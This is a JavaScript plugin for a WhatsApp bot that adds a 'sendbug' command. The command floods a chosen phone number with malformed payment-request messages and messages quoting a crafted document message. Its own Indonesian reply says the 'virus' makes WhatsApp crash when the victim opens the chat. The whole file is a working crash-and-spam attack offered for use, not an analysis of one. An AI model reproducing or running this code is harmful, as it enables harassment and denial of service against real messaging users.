const sendVirusHandler = async (m, { conn, text, command }) => {
  let num = text.split('/')[0] + "@s.whatsapp.net";
  let jumlah = text.split('/')[1];
  
  await m.reply('Tunggu Sebentar...');

  const thumb = {
    backgroundImageUrl: 'https://example.com/background.jpg',
    fullSizeImageUrl: 'https://example.com/fullsize.jpg',
    aspectRatio: 1.77, // example aspect ratio
    previewImageUrl: 'https://example.com/preview.jpg',
    accentColor: '#FFFFFF',
  };

  const dann = {
    key: {
      fromMe: false,
      participant: `0@s.whatsapp.net`,
      ...(m.chat ? { remoteJid: '' } : {}),
    },
    message: {
      documentMessage: {
        url: 'https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc',
        mimetype: 'application/octet-stream',
        fileSha256: 'TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=',
        fileLength: '64455',
        pageCount: 1,
        mediaKey: 'P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=',
        fileName: 'Dann-MD',
        fileEncSha256: 'ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=',
      },
    },
  };

  for (let i = 0; i < jumlah; i++) {
    conn.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: '🗿', currencyCodeIso4217: 'IDR', requestFrom: '@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb } } } }, {});
    conn.sendMessage(num, { text: '🗿' }, { quoted: dann });
  }

  m.reply(`Sukses Mengirim ${command}\nKe Nomor: ${text}\n\n*Note :* Virus ini aktif ketika korban membuka chat nya, maka WhatsApp akan crash hehe🗿`);
};

sendVirusHandler.help = ['sendbug <nomer/jumlah>'];
sendVirusHandler.tags = ['tools'];
sendVirusHandler.command = /^(sendbug)$/i;
sendVirusHandler.premium = true;

export default sendVirusHandler;
